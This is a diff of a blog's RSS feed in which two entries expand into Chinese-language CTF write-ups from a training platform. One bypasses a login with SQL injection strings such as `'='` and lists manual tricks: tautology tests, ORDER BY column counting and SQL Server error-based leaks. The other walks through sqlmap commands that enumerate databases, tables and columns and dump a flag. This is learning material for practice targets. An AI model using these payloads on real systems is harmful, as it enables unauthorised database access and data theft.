@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Ctf_web on 专心打杂</title>
+    <title>Ctf_web on (*´･д･)?</title>
     <link>http://xrazor.org/tags/ctf_web/</link>
-    <description>Recent content in Ctf_web on 专心打杂</description>
+    <description>Recent content in Ctf_web on (*´･д･)?</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>zh-CN</language>
+    <language>en-us</language>
     <lastBuildDate>Thu, 05 Apr 2018 21:10:24 +0800</lastBuildDate>
     
 	<atom:link href="http://xrazor.org/tags/ctf_web/index.xml" rel="self" type="application/rss+xml" />
@@ -17,7 +17,17 @@
       <pubDate>Thu, 05 Apr 2018 21:10:24 +0800</pubDate>
       
       <guid>http://xrazor.org/post/ctf_web_02sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/</guid>
-      <description>来源 题目 题目来源:实验吧 题目:http://ctf5.shiyanbar.com/web/wonderkun/web/index.html 解</description>
+      <description>来源
+题目 题目来源:实验吧
+题目:http://ctf5.shiyanbar.com/web/wonderkun/web/index.html
+解题 打开后就一个框，什么都没有，在username的地方我们输入&#39; or 1=1,意图是构造如下sql语句：
+select * from user where username=&#39;&#39; or 1=1;  然而失败了，看结果我们知道是过滤了关键字or，但是没有过滤单引号，所以接下来我们只能构造仅有单引号的语句。
+select * from user where username=&#39; &#39; =&#39; &#39;  username=&amp;rsquo; &amp;lsquo;会返回false，然后false 等于&amp;rsquo; &amp;lsquo;(NULL)，结果就是true了，奇技淫巧有没有，渗透就是这种节奏。
+我们实际输入&amp;rsquo;=&amp;lsquo;, password的地方也如此。结果就成功了。
+关于其他手工注入常用奇技淫巧的总结 1.判断是否存在注入漏洞 &#39; and 1=1 and 1=2  2.通过枚举查看字段个数 Order by 数字  比如:
+select * from user order by 3  如果正常返回则说明有第三列，继续：
+select * from user order by 4  如果此时报错，说明此表只有3个字段
+3.对于SQLserver and user &amp;gt; 0  user是SQLserver的内置参数，类型是nvarchar，当和int比较时，会先将nvarchar转化为int， 转化过程中可能会报错，比如:将nvarchar值 ”xxx” 转换数据类型为 int 的列时发生语法错误。xxx正是user的值！ (待续)</description>
     </item>
     
     <item>
@@ -26,7 +36,19 @@
       <pubDate>Sun, 01 Apr 2018 08:48:58 +0800</pubDate>
       
       <guid>http://xrazor.org/post/ctf_web_01sqlmap%E5%AE%9E%E9%AA%8C%E8%BF%99%E4%B8%AA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%9C%89%E7%82%B9%E7%AE%80%E5%8D%95/</guid>
-      <description>从今天开始学习CTF, 主攻Web+Misc。 不积跬步无以至千里，不积小流无以至江海。慢慢来，细细看，玩中学。 今天先来学习一下sqlmap。 题</description>
+      <description>从今天开始学习CTF, 主攻Web+Misc。
+不积跬步无以至千里，不积小流无以至江海。慢慢来，细细看，玩中学。
+今天先来学习一下sqlmap。
+题目 题目来源:实验吧
+题目:http://ctf5.shiyanbar.com/8/index.php?id=1
+解题 1.手工注入测试 http://ctf5.shiyanbar.com/8/index.php?id=1&#39;  在末尾添加单引号：id=1&amp;rsquo;
+这样如果报错则可初步判断存在注入点。
+2.上sqlmap扫描 sqlmap -u &amp;quot;http://ctf5.shiyanbar.com/8/index.php?id=1&amp;quot; --dbs  很快就扫出了3个DB的名字，看着这个my_db嫌疑比较大，接下来我们就对它下手。
+3.获取tables sqlmap -u &amp;quot;http://ctf5.shiyanbar.com/8/index.php?id=1&amp;quot; -D my_db --tables  马上拿到了table名,显然我们要找的是这个thiskey,别问我怎么知道的:D
+4.获取字段 sqlmap -u &amp;quot;http://ctf5.shiyanbar.com/8/index.php?id=1&amp;quot; -D my_db -T thiskey --columns  这样我们就拿到了column, 下一步就是猜解字段内容
+5.猜解内容 sqlmap -u &amp;quot;http://ctf5.shiyanbar.com/8/index.php?id=1&amp;quot; -D my_db -T thiskey -C k0y --dump  这样我们就拿到了第一个flag.
+虽然简单，却也大概了解了sqlmap的能力和用法。
+明天见。</description>
     </item>
     
   </channel>
